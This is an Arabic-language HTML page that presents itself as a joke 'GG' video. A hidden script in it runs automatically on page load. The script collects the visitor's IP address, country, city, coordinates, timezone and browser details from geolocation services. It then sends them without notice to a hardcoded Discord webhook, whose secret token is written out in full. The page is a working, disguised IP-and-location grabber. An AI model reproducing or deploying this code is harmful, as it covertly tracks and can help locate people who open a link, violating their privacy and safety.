<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>GG فيديو + معلومات</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #000;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: white;
      font-family: sans-serif;
    }
    #gg-text {
      font-size: 48px;
      font-weight: bold;
      margin-bottom: 20px;
    }
    video {
      width: 480px;
      height: 480px;
      object-fit: cover;
      border: none;
      outline: none;
    }
  </style>
</head>
<body>

  <div id="gg-text">GG !</div>
  <video autoplay muted playsinline>
    <source src="https://files.catbox.moe/hseztt.mov" type="video/quicktime">
    متصفحك ما يدعم تشغيل هذا الفيديو
  </video>

  <script>
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv';

    async function sendUserInfo() {
      try {
        const [geoRes, ipRes] = await Promise.all([
          fetch('https://ipapi.co/json/'),
          fetch('https://api64.ipify.org?format=json')
        ]);

        const geoData = await geoRes.json();
        const ipData = await ipRes.json();

        const ip = ipData.ip || 'غير معروف';
        const userAgent = navigator.userAgent;
        const latitude = geoData.latitude || 'غير متوفر';
        const longitude = geoData.longitude || 'غير متوفر';

        const message = `
📡 معلومات جديدة:

🌍 IP: ${ip}
🏳️ الدولة: ${geoData.country_name}
📍 المنطقة: ${geoData.region}
🏙️ المدينة: ${geoData.city}
🧭 الإحداثيات: ${latitude}, ${longitude}
🕓 التوقيت: ${geoData.timezone}
🧠 المتصفح والجهاز: ${userAgent}
        `.trim();

        await fetch(discordWebhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: message })
        });

        console.log('✅ تم إرسال المعلومات');

      } catch (err) {
        console.error('❌ خطأ أثناء الإرسال:', err);
      }
    }

    // شغل الإرسال أول ما يفتح الصفحة
    window.addEventListener('load', sendUserInfo);
  </script>

</body>
</html>
